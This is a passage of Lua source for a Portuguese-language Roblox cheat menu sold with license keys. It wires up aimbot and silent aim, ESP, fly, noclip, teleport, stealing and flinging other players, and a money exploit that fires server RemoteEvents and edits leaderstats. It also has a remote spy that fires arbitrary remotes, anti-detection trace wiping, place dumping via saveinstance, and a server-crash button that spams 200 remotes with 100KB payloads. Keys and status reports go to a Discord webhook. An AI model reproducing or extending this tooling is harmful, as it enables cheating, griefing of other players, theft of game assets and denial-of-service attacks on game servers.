    tgl(c2,"LOCK-ON ligado",false,function(v) S.aim.lock=v end,"segurar botão direito (PC) ou tocando (mobile)")

    local c3=card(L,"Silent Aim")
    tgl(c3,"Silent aim",false,function(v) S.aim.silent=v end,hookmetamethod and "redireciona raycast" or "executor sem hookmetamethod")

    local c4=card(R,"Filtros")
    tgl(c4,"Não mirar em time",true,function(v) S.aim.team_check=v end)
    tgl(c4,"Só visíveis",false,function(v) S.aim.visible_only=v end)
    tgl(c4,"Mostrar FOV",true,function(v) S.aim.show_fov=v end)
    tgl(c4,"No Recoil",false,function(v) S.no_recoil.on=v end,"SAFE — 100% client-side, zero ban")

    local c5=card(L,"🤝 Whitelist")
    local plist=make("ScrollingFrame",{Size=UDim2.new(1,0,0,180),BackgroundColor3=THEME.bg,BorderSizePixel=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollBarThickness=2,ScrollBarImageColor3=THEME.accent,Parent=c5}); corner(plist,6); make("UIListLayout",{Padding=UDim.new(0,2)},plist); pad(plist,4)
    local function refresh_wl() for _,x in ipairs(plist:GetChildren()) do if x:IsA("TextButton") then x:Destroy() end end; for _,p in ipairs(Players:GetPlayers()) do if p==LP then continue end; local on=in_wl(p.Name); local row=make("TextButton",{Size=UDim2.new(1,-4,0,24),BackgroundColor3=on and THEME.good or THEME.card2,BorderSizePixel=0,Text="",AutoButtonColor=false,Parent=plist}); corner(row,4); label(row,"  "..(on and "✓ " or "  ")..p.Name,11,true).Size=UDim2.new(1,-8,1,0); row.MouseButton1Click:Connect(function() if on then for i,n in ipairs(CfgDB.aim_whitelist) do if n==p.Name then table.remove(CfgDB.aim_whitelist,i); break end end else table.insert(CfgDB.aim_whitelist,p.Name) end; save_json(P_CFG,CfgDB); refresh_wl() end) end end
    wbtn(c5,"Atualizar",THEME.card2,refresh_wl); refresh_wl()
    track(Players.PlayerAdded:Connect(refresh_wl)); track(Players.PlayerRemoving:Connect(function() task.wait(0.3); if MainRoot.Parent then refresh_wl() end end))
end

do local list=dual(pESP); local L,R=two(list)
    local c=card(L,"Visualização"); tgl(c,"ESP ligado",false,function(v) S.esp.on=v end); tgl(c,"Caixa",true,function(v) S.esp.box=v end); tgl(c,"Nome+distância",true,function(v) S.esp.name=v end); tgl(c,"Barra HP",true,function(v) S.esp.hp=v end); tgl(c,"Tracer",false,function(v) S.esp.tracer=v end); tgl(c,"CHAMS",false,function(v) S.esp.chams=v end); tgl(c,"Cor por time",false,function(v) S.esp.team=v end)
    local c2=card(R,"Filtros"); tgl(c2,"Não mostrar aliados",true,function(v) S.esp.team_check=v end); sld(c2,"Distância máx",100,10000,2000,function(v) S.esp.max_dist=v end)
end

do local list=dual(pMove); local L,R=two(list)
    local c=card(L,"Fly"); tgl(c,"Fly",false,function(v) S.fly.on=v; if v then start_fly() else stop_fly() end end); sld(c,"Velocidade",10,500,60,function(v) S.fly.speed=v end); tgl(c,"Freecam",false,toggle_freecam); sld(c,"Vel freecam",1,10,1,function(v) S.freecam.speed=v end)
    local c2=card(R,"Speed"); tgl(c2,"Speed",false,function(v) S.speed.on=v; if not v then local h=hum(); if h then h.WalkSpeed=16 end end end); sld(c2,"Walkspeed",16,500,50,function(v) S.speed.value=v end); tgl(c2,"Click TP",false,function(v) S.click_tp.on=v end)
    local c3=card(L,"Pulo + Noclip"); tgl(c3,"Jump custom",false,function(v) S.jump.on=v; if not v then local h=hum(); if h then h.JumpPower=50 end end end); sld(c3,"Jump power",50,500,80,function(v) S.jump.value=v end); tgl(c3,"Pulo infinito",false,function(v) S.inf_jump.on=v end); tgl(c3,"Noclip",false,function(v) S.noclip.on=v end)
    local c4=card(R,"Visual"); tgl(c4,"Fullbright",false,function(v) S.fullbright.on=v; apply_fullbright(v) end); tgl(c4,"Zoom",false,function(v) S.zoom.on=v; if not v then Camera.FieldOfView=70 end end); sld(c4,"FOV",30,120,90,function(v) S.zoom.value=v end); tgl(c4,"Crosshair",false,function(v) S.crosshair.on=v end); tgl(c4,"Hitbox expander",false,function(v) S.hitbox.on=v end); sld(c4,"Tamanho hitbox",2,30,10,function(v) S.hitbox.size=v end); tgl(c4,"Anti-AFK",false,function(v) S.anti_afk.on=v end)
end

do local list=dual(pTP); local L,R=two(list)
    local c=card(L,"Teleporte"); local inp=winp(c,"nome do player"); inp:GetPropertyChangedSignal("Text"):Connect(function() S.tp.target=inp.Text end); wbtn(c,"TP",nil,function() if S.tp.target~="" then tp_player(S.tp.target) end end); local sv; wbtn(c,"Salvar posição",THEME.card2,function() local r=hrp(); if r then sv=r.CFrame end end); wbtn(c,"TP salva",THEME.card2,function() if sv then tp_to(sv) end end)
    local c2=card(R,"Players"); local lst=make("ScrollingFrame",{Size=UDim2.new(1,0,0,220),BackgroundColor3=THEME.bg,BorderSizePixel=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollBarThickness=2,ScrollBarImageColor3=THEME.accent,Parent=c2}); corner(lst,6); make("UIListLayout",{Padding=UDim.new(0,2)},lst); pad(lst,4)
    local function ref() for _,x in ipairs(lst:GetChildren()) do if x:IsA("Frame") then x:Destroy() end end; for _,p in ipairs(Players:GetPlayers()) do if p~=LP then local row=make("Frame",{Size=UDim2.new(1,-4,0,28),BackgroundColor3=THEME.card2,BorderSizePixel=0,Parent=lst}); corner(row,4); label(row,"  "..p.Name,11).Size=UDim2.new(1,-70,1,0); local g=make("TextButton",{Size=UDim2.new(0,60,0,22),Position=UDim2.new(1,-66,0.5,-11),BackgroundColor3=THEME.accent,BorderSizePixel=0,Text="TP",TextColor3=THEME.text,Font=Enum.Font.GothamBold,TextSize=11,Parent=row}); corner(g,3); g.MouseButton1Click:Connect(function() tp_player(p.Name) end) end end end
    wbtn(c2,"Atualizar",THEME.card2,ref); ref()
end

do local list=dual(pArmas); local c=card(list,"Armas")
    local lst=make("ScrollingFrame",{Size=UDim2.new(1,0,0,280),BackgroundColor3=THEME.bg,BorderSizePixel=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollBarThickness=2,ScrollBarImageColor3=THEME.accent,Parent=c}); corner(lst,6); make("UIListLayout",{Padding=UDim.new(0,3)},lst); pad(lst,4)
    local function ref() for _,x in ipairs(lst:GetChildren()) do if x:IsA("Frame") then x:Destroy() end end; for _,t in ipairs(scan_tools()) do local row=make("Frame",{Size=UDim2.new(1,-4,0,28),BackgroundColor3=THEME.card2,BorderSizePixel=0,Parent=lst}); corner(row,4); label(row,"  "..t.Name.."  < "..t.Parent.Name.." >",11).Size=UDim2.new(1,-70,1,0); local g=make("TextButton",{Size=UDim2.new(0,60,0,22),Position=UDim2.new(1,-66,0.5,-11),BackgroundColor3=THEME.accent,BorderSizePixel=0,Text="pegar",TextColor3=THEME.text,Font=Enum.Font.GothamBold,TextSize=11,Parent=row}); corner(g,3); g.MouseButton1Click:Connect(function() grab(t) end) end end
    wbtn(c,"Atualizar",THEME.card2,ref); wbtn(c,"Pegar TODAS",nil,function() for _,t in ipairs(scan_tools()) do pcall(grab,t) end end); ref()
end

-- TROLLS (populadas de verdade)
do local list=dual(pTroll); local L,R=two(list)
    local c=card(L,"Trolls em você")
    tgl(c,"🌪️ Tornado Mode",false,function(v) S.tornado.on=v; toggle_tornado(v) end,"objetos girando ao redor")
    tgl(c,"🐭 Tiny Player",false,function(v) tiny_player(v) end,"vira minúsculo (0.3x)")
    tgl(c,"🦍 Giant Player",false,function(v) giant_player(v) end,"vira gigante (3x)")
    tgl(c,"👻 Invisível",false,set_invisible)
    tgl(c,"⚡ God Mode (local)",false,god_mode)
    tgl(c,"🌀 Spin (girar)",false,do_spin)
    wbtn(c,"💥 Fling self",nil,fling_self,"se joga em velocidade absurda")

    local c2=card(R,"Trolls em outros")
    local flingInp = winp(c2,"nome pra arremessar")
    wbtn(c2,"🚀 Fling Player",nil,function() if flingInp.Text~="" then fling_player(flingInp.Text) end end,"arremessa o alvo pra longe")
    local followInp = winp(c2,"nome pra perseguir")
    wbtn(c2,"👀 Grudar nas costas",nil,function() S.troll.follow_target=followInp.Text; notify("Perseguindo",followInp.Text,"success",2) end)
    wbtn(c2,"✋ Parar perseguição",THEME.card2,function() S.troll.follow_target="" end)
    label(c2,"OBS: alterar animações de outros players exige server-side. Esses trolls se limitam a seguir/arremessar.",10,false,THEME.text2).Size=UDim2.new(1,0,0,30)
end

-- MONEY (2 opções)
do local list=dual(pMoney)
    local c=card(list,"💰 Setar Dinheiro")
    label(c,"Duas abordagens: a REMOTA tenta via RemoteEvents do servidor, a DIRETA edita leaderstats client-side (afeta HUD local e alguns jogos sem validação).",11,false,THEME.text2).Size=UDim2.new(1,0,0,48)
    local valInp = winp(c,"valor (default: 999999999)")
    local out = label(c,"",10,false,THEME.text2); out.Size=UDim2.new(1,0,0,60); out.TextWrapped=true

    wbtn(c,"💸 OPÇÃO 1 — Exploit via Remote",nil,function()
        local v=tonumber(valInp.Text) or 999999999
        out.Text="disparando em remotes..."
        task.spawn(function()
            local n,names = money_exploit_remote(v)
            out.Text = ("REMOTO — disparou em %d remotes:\n%s"):format(n, table.concat(names,", "):sub(1,200))
            notify("Money Remoto", n.." remotes testados", n>0 and "success" or "warn", 4)
        end)
    end,"testa RemoteEvents que contém palavras de dinheiro")

    wbtn(c,"⚡ OPÇÃO 2 — Editar Leaderstats direto",THEME.accent2,function()
        local v=tonumber(valInp.Text) or 999999999
        out.Text="editando leaderstats..."
        task.spawn(function()
            local n, names = money_edit_direct(v)
            if n == 0 then
                out.Text = "DIRETO — nenhuma leaderstat de dinheiro detectada\nuse OPÇÃO 1"
                notify("Money Direto","sem stats pra editar — tente Remoto","error",4)
            else
                out.Text = ("DIRETO — alterou %d stats:\n%s"):format(n, table.concat(names,", "))
                notify("Money Direto", "setou "..n.." stats pra "..v, "success", 4)
            end
        end)
    end,"escreve direto nos IntValue/NumberValue das suas stats (client-side)")

    wbtn(c,"🔁 LOOP INFINITO (ambos, 60s)",THEME.card2,function()
        task.spawn(function()
            for i=1,20 do
                local v=tonumber(valInp.Text) or 999999999
                money_exploit_remote(v)
                money_edit_direct(v)
                task.wait(3)
            end
            notify("Loop","terminou","warn")
        end)
        notify("Loop iniciado","ambas opções por 60s","success",3)
    end)
end

do local list=dual(pSpy)
    local info=card(list,"⚡ Remote Spy manual")
    local filterInp=winp(info,"filtrar"); local argsInp=winp(info,"args")
    local rl=make("ScrollingFrame",{Size=UDim2.new(1,0,0,280),BackgroundColor3=THEME.bg,BorderSizePixel=0,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ScrollBarThickness=2,ScrollBarImageColor3=THEME.accent,Parent=info}); corner(rl,6); make("UIListLayout",{Padding=UDim.new(0,2)},rl); pad(rl,4)
    local function ref() for _,x in ipairs(rl:GetChildren()) do if x:IsA("Frame") then x:Destroy() end end; local f=filterInp.Text:lower(); for _,r in ipairs(scan_remotes()) do if f~="" and not r.name:lower():find(f,1,true) then continue end; local row=make("Frame",{Size=UDim2.new(1,-4,0,38),BackgroundColor3=THEME.card2,BorderSizePixel=0,Parent=rl}); corner(row,4); label(row,"  "..r.name,11,true).Size=UDim2.new(1,-80,0,16); row:GetChildren()[#row:GetChildren()].Position=UDim2.new(0,4,0,4); label(row,"  "..r.type.." | "..r.path:sub(1,60),9,false,THEME.text2).Position=UDim2.new(0,4,0,20); row:GetChildren()[#row:GetChildren()].Size=UDim2.new(1,-80,0,14); local b=make("TextButton",{Size=UDim2.new(0,70,0,26),Position=UDim2.new(1,-76,0.5,-13),BackgroundColor3=THEME.accent,BorderSizePixel=0,Text="FIRE",TextColor3=THEME.text,Font=Enum.Font.GothamBold,TextSize=11,Parent=row}); corner(b,4); b.MouseButton1Click:Connect(function() local args={}; for p in argsInp.Text:gmatch("[^,]+") do p=p:match("^%s*(.-)%s*$"); table.insert(args,tonumber(p) or p=="true" and true or p=="false" and false or p) end; pcall(function() if r.ref:IsA("RemoteEvent") then r.ref:FireServer(table.unpack(args)) else r.ref:InvokeServer(table.unpack(args)) end end); notify("Fire",r.name,"success",2) end) end end
    wbtn(info,"Scan",THEME.card2,ref); ref()
end

do local list=dual(pBypass)
    label(list,"✓ GUI ofuscada em gethui()\n✓ BodyMovers genéricos\n✓ protect_gui aplicado\n✓ conexões rastreadas",11,false,THEME.text).Size=UDim2.new(1,0,0,70)
    wbtn(list,"🛡️ DESINJETAR AGORA",THEME.accent2,function() notify("Desinjetando...","","warn",2); task.wait(0.5); wipe_traces() end)
end

do local list=dual(pCfg); local L,R=two(list)
    local c=card(L,"Interface"); tgl(c,"Stream Mode",false,function(v) StreamOn=v; apply_stream() end); sld(c,"Transparência",0,80,math.floor(CfgDB.transparency*100),function(v) CfgDB.transparency=v/100; save_json(P_CFG,CfgDB); MainRoot.BackgroundTransparency=CfgDB.transparency end); wbtn(c,"Deslogar",THEME.card2,function() Session.user=nil; save_json(P_SESS,Session); ScreenGui:Destroy() end)
    local c2=card(L,"Cor"); ddn(c2,"accent",{{label="Vermelho",rgb={220,38,38}},{label="Azul",rgb={38,120,220}},{label="Verde",rgb={38,180,90}},{label="Roxo",rgb={150,60,220}}},function(o) CfgDB.accent=o.rgb; save_json(P_CFG,CfgDB); notify("Cor","recarregue","warn",3) end)
    local c3=card(R,"Status"); wbtn(c3,"📤 Enviar status",nil,function() send_status(cu,ia); notify("Status","embed enviado","success",2) end)
    local c4=card(R,"Hotkeys"); label(c4,"K / Insert / End — menu",12).Size=UDim2.new(1,0,0,16); label(c4,"ou botão flutuante no canto",12,false,THEME.text2).Size=UDim2.new(1,0,0,16); label(c4,"F1 fly | F2 speed | F3 tp",12).Size=UDim2.new(1,0,0,16)
end

if pKeys then local list=dual(pKeys); local L,R=two(list)
    local c=card(L,"Gerar keys"); local sel=DURATIONS[1]; local opts={}; for _,d in ipairs(DURATIONS) do table.insert(opts,{label=d.label,data=d}) end; ddn(c,"duração",opts,function(o) sel=o.data end)
    local qty=winp(c,"qty (1-500)"); local res=label(c,"",10,false,THEME.text2); res.Size=UDim2.new(1,0,0,100); res.TextWrapped=true; res.Font=Enum.Font.Code; res.TextYAlignment=Enum.TextYAlignment.Top
    wbtn(c,"Gerar",nil,function()
        local q=tonumber(qty.Text) or 0
        if q<1 or q>500 then notify("Erro","qty inválida (1-500)","error"); return end
        local ks = generate_keys(sel.seconds, sel.label, q, cu)
        res.Text = table.concat(ks, "\n")
        notify("Keys geradas", q.." keys enviadas pro webhook do Discord", "success", 4)
    end)
    local c2=card(R,"Reset HWID"); local ui=winp(c2,"usuário")
    wbtn(c2,"Resetar",nil,function() local ok,m=admin_reset_hwid(ui.Text); notify(ok and "OK" or "Falhou",tostring(m or ui.Text),ok and "success" or "error") end)
end

if pLeak then local list=dual(pLeak); local c=card(list,"Save Instance")
    wbtn(c,"Dumpar place",nil,function() local ok,msg=try_saveinstance(); notify(ok and "Leak" or "Falhou",msg,ok and "success" or "error",5) end)
end

if pCrash then local list=dual(pCrash); local c=card(list,"Crash Server")
    label(c,"spam de 200×remotes com payload 100KB. pode te kickar.",11,false,THEME.text2).Size=UDim2.new(1,0,0,22)
    wbtn(c,"TENTAR CRASHAR",THEME.accent2,function() local n=crash_server_attempt(); notify("Crash",n.." enviados","warn",5) end)
end

tabs["Início"].btn.MouseButton1Click:Fire()
menuVisible=true

track(LP.CharacterAdded:Connect(function() task.wait(0.5); if S.fly.on then start_fly() end end))

send_status(cu, ia)
task.spawn(function() while MainRoot.Parent do task.wait(300); send_status(cu, ia) end end)
notify("PK Cheats Brasil","tecla K/Insert/End ou botão flutuante","success",5)
end

-- AUTH
run_splash(function()
    local LoginRoot=make("Frame",{Name="Login",Size=UDim2.new(0,480,0,520),Position=UDim2.new(0.5,-240,0.5,-260),BackgroundColor3=THEME.bg2,BorderSizePixel=0,Parent=ScreenGui}); corner(LoginRoot,14); stroke(LoginRoot,THEME.accent,1.5); gradient_pro(LoginRoot,THEME.bg2,THEME.bg,THEME.bg2,90)
    local lClose=make("TextButton",{Size=UDim2.new(0,30,0,30),Position=UDim2.new(1,-40,0,12),BackgroundColor3=THEME.card,Text="×",TextColor3=THEME.accent,Font=Enum.Font.GothamBold,TextSize=20,BorderSizePixel=0,Parent=LoginRoot}); corner(lClose,15); stroke(lClose,THEME.accent); animate_btn(lClose)
    lClose.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
    build_logo(LoginRoot,140).Position=UDim2.new(0.5,-70,0,20)
    label(LoginRoot,"bem-vindo de volta",13,false,THEME.text2).Position=UDim2.new(0,30,0,170); LoginRoot:GetChildren()[#LoginRoot:GetChildren()].Size=UDim2.new(1,-60,0,16); LoginRoot:GetChildren()[#LoginRoot:GetChildren()].TextXAlignment=Enum.TextXAlignment.Center
    local LBody=make("Frame",{BackgroundTransparency=1,Size=UDim2.new(1,-60,0,240),Position=UDim2.new(0,30,0,200),Parent=LoginRoot}); make("UIListLayout",{Padding=UDim.new(0,10)},LBody)
    local function ainp(parent,ph) local wrap=make("Frame",{BackgroundColor3=THEME.card,BorderSizePixel=0,Size=UDim2.new(1,0,0,42),Parent=parent}); corner(wrap,8); stroke(wrap,THEME.stroke); local b=make("TextBox",{BackgroundTransparency=1,Size=UDim2.new(1,-20,1,0),Position=UDim2.new(0,14,0,0),PlaceholderText=ph,PlaceholderColor3=THEME.text2,TextColor3=THEME.text,Font=Enum.Font.Gotham,TextSize=13,TextXAlignment=Enum.TextXAlignment.Left,Text="",ClearTextOnFocus=false,Parent=wrap}); return b end
    local LUser=ainp(LBody,"usuário"); local LPass=ainp(LBody,"senha")
    local LBtn=make("TextButton",{BackgroundColor3=THEME.accent,BorderSizePixel=0,Size=UDim2.new(1,0,0,46),Text="ENTRAR",TextColor3=THEME.text,Font=Enum.Font.GothamBold,TextSize=15,AutoButtonColor=false,Parent=LBody}); corner(LBtn,8); gradient_pro(LBtn,THEME.accent,THEME.accent2,THEME.accent3,90); animate_btn(LBtn)
    make("Frame",{BackgroundColor3=THEME.stroke,BorderSizePixel=0,Size=UDim2.new(1,0,0,1),Parent=LBody})
    local LToReg=make("TextButton",{BackgroundColor3=THEME.card,BorderSizePixel=0,Size=UDim2.new(1,0,0,42),Text="criar conta nova",TextColor3=THEME.text,Font=Enum.Font.GothamBold,TextSize=13,AutoButtonColor=false,Parent=LBody}); corner(LToReg,8); stroke(LToReg,THEME.accent); animate_btn(LToReg)
    local LStat=label(LoginRoot,"",11,false,THEME.danger); LStat.Size=UDim2.new(1,-60,0,16); LStat.Position=UDim2.new(0,30,1,-52); LStat.TextXAlignment=Enum.TextXAlignment.Center
    label(LoginRoot,DISCORD.." • v8.0",10,false,THEME.text2).Position=UDim2.new(0,30,1,-26); LoginRoot:GetChildren()[#LoginRoot:GetChildren()].Size=UDim2.new(1,-60,0,14); LoginRoot:GetChildren()[#LoginRoot:GetChildren()].TextXAlignment=Enum.TextXAlignment.Center

    local RegRoot=make("Frame",{Name="Register",Size=UDim2.new(0,480,0,600),Position=UDim2.new(0.5,-240,0.5,-300),BackgroundColor3=THEME.bg2,BorderSizePixel=0,Visible=false,Parent=ScreenGui}); corner(RegRoot,14); stroke(RegRoot,THEME.accent,1.5); gradient_pro(RegRoot,THEME.bg2,THEME.bg,THEME.bg2,90)
    local rClose=make("TextButton",{Size=UDim2.new(0,30,0,30),Position=UDim2.new(1,-40,0,12),BackgroundColor3=THEME.card,Text="×",TextColor3=THEME.accent,Font=Enum.Font.GothamBold,TextSize=20,BorderSizePixel=0,Parent=RegRoot}); corner(rClose,15); stroke(rClose,THEME.accent); animate_btn(rClose)
    rClose.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
    build_logo(RegRoot,140).Position=UDim2.new(0.5,-70,0,20)
    label(RegRoot,"crie sua conta com uma key válida",13,false,THEME.text2).Position=UDim2.new(0,30,0,170); RegRoot:GetChildren()[#RegRoot:GetChildren()].Size=UDim2.new(1,-60,0,16); RegRoot:GetChildren()[#RegRoot:GetChildren()].TextXAlignment=Enum.TextXAlignment.Center
    local RBody=make("Frame",{BackgroundTransparency=1,Size=UDim2.new(1,-60,0,320),Position=UDim2.new(0,30,0,200),Parent=RegRoot}); make("UIListLayout",{Padding=UDim.new(0,10)},RBody)
    local RUser=ainp(RBody,"usuário (min 3)"); local RPass=ainp(RBody,"senha (min 4)"); local RKey=ainp(RBody,"PK-XXXX-XXXX-XXXX-XXXX")
    local RBtn=make("TextButton",{BackgroundColor3=THEME.accent,BorderSizePixel=0,Size=UDim2.new(1,0,0,46),Text="CADASTRAR",TextColor3=THEME.text,Font=Enum.Font.GothamBold,TextSize=15,AutoButtonColor=false,Parent=RBody}); corner(RBtn,8); gradient_pro(RBtn,THEME.accent,THEME.accent2,THEME.accent3,90); animate_btn(RBtn)
    make("Frame",{BackgroundColor3=THEME.stroke,BorderSizePixel=0,Size=UDim2.new(1,0,0,1),Parent=RBody})
    local RToLog=make("TextButton",{BackgroundColor3=THEME.card,BorderSizePixel=0,Size=UDim2.new(1,0,0,42),Text="já tenho conta — entrar",TextColor3=THEME.text,Font=Enum.Font.GothamBold,TextSize=13,AutoButtonColor=false,Parent=RBody}); corner(RToLog,8); stroke(RToLog,THEME.accent); animate_btn(RToLog)
    local RStat=label(RegRoot,"",11,false,THEME.danger); RStat.Size=UDim2.new(1,-60,0,16); RStat.Position=UDim2.new(0,30,1,-26); RStat.TextXAlignment=Enum.TextXAlignment.Center

    LToReg.MouseButton1Click:Connect(function() LoginRoot.Visible=false; RegRoot.Visible=true end)
    RToLog.MouseButton1Click:Connect(function() RegRoot.Visible=false; LoginRoot.Visible=true end)

    local function do_login(u,p) local rec=UserDB[u]; if not rec then return false,"usuário não existe" end; if rec.pass~=p then return false,"senha errada" end; if not rec.admin then local ok,why=key_active(u); if not ok then if why=="HWID_MISMATCH" then return false,"conta travada em outro device" end; if why=="EXPIRED" or why=="NO_KEY" then delete_expired(u); return false,"key expirada — conta liberada, cadastre novamente" end; return false,"key inválida" end end; Session.user=u; save_json(P_SESS,Session); return true end
    local function do_register(u,p,k) if UserDB[u] then return false,"usuário já existe" end; if #u<3 then return false,"muito curto" end; if #p<4 then return false,"senha curta" end; if not KeyDB[k] then return false,"key inválida" end; if KeyDB[k].used_by then return false,"key já usada" end; UserDB[u]={pass=p,admin=false,key=nil,exp=nil,created=os.time()}; save_json(P_USERS,UserDB); local ok,msg=redeem_key(u,k); if not ok then UserDB[u]=nil; save_json(P_USERS,UserDB); return false,msg end; return true end

    LBtn.MouseButton1Click:Connect(function() local u,p=LUser.Text,LPass.Text; local ok,msg=do_login(u,p); if ok then LoginRoot:Destroy(); RegRoot:Destroy(); build_menu(u,UserDB[u].admin==true); notify("Entrou","bem-vindo, "..u,"success",3) else LStat.Text=msg; notify("Falha",msg,"error") end end)
    RBtn.MouseButton1Click:Connect(function() local u,p,k=RUser.Text,RPass.Text,RKey.Text; local ok,msg=do_register(u,p,k); if ok then RStat.Text="cadastrado!"; RStat.TextColor3=THEME.good; notify("OK","faça login","success",4); task.wait(1.3); RegRoot.Visible=false; LoginRoot.Visible=true; LUser.Text=u; LPass.Text="" else RStat.Text=msg; notify("Falha",msg,"error") end end)
    if Session.user and UserDB[Session.user] then local u=Session.user; local rec=UserDB[u]; if rec.admin or key_active(u) then LoginRoot:Destroy(); RegRoot:Destroy(); build_menu(u,rec.admin==true) end end
end)
